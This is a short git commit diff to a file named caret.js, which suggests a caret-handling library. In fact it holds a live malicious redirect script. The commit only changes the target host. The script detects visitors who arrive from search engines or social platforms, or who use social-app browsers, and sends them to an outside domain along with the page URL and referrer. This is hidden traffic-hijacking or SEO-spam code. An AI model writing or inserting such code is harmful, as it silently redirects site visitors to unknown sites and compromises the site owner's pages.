40d39697be37fb0397b4b203886b6e21078e5a31
Aini Sastra <aini.sastra@gmail.com>
2022-10-04 11:16:25 +0800

    Update caret.js

--- caret.js
+++ caret.js
@@ -1,2 +1,2 @@
-var ars = 'https://caretxdigital.com';
+var ars = 'https://www.caretxdigital.com';
 if(['.google.', 'bing.', '.yahoo.', 'yandex.', 'facebook.', 'pinterest.', 'duckduckgo.', 'aol.', 'msn.', 'baidu.', 'slurp.', 'sogou.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
